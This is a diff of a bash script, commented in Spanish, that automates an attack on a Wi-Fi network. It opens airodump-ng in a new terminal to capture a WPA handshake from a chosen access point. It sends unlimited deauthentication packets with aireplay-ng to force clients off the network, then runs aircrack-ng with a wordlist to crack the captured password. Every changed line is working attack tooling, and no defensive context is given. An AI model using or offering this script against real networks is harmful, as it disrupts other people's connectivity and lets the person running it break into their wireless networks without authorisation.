@@ -157,18 +157,26 @@ echo -e "$BOLD_WHITE BSSID: $WHITE$BSSID"
 echo -e "$BOLD_WHITE Canal: $WHITE$CANAL"
 rm info-01.csv
 
+#Comprobamos que tipo de terminal esta usando para ejecutar el siguiente c omando en una ventana aparte
+TERM=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
+echo -e "$TERM"
+
 #Empezamos a capturar hasta encontrar el handshake
-#screen -d -m airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $INT_NAME
+$TERM -e airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $INT_NAME & 
+echo "¿esto continua?"
+
+sleep 5
 
 #Lanzamos el ataque (paquetes de deautentificacion)
-echo -e "$BOLD_RED Enviando paquetes de deautentificacion"
-aireplay-ng --deauth 0 -a $BSSID $INT_NAME
-
+echo -e "$BOLD_RED Enviando paquetes de deautentificacion $WHITE"
+$TERM -e aireplay-ng --deauth 0 -a $BSSID $INT_NAME 
 
 #Probamos a crackear la contraseña
 echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
 read WORDLIST
+echo -e "Probando crackeo de la contraseña..."
+aircrack-ng handshake-01.cap -w $WORDLIST >> crack.txt
 
-aircrack-ng hanshake-o1.cap -w $WORDLIST
+echo "Pasando a modo managed"
 manage_mode $INT_NAME
 
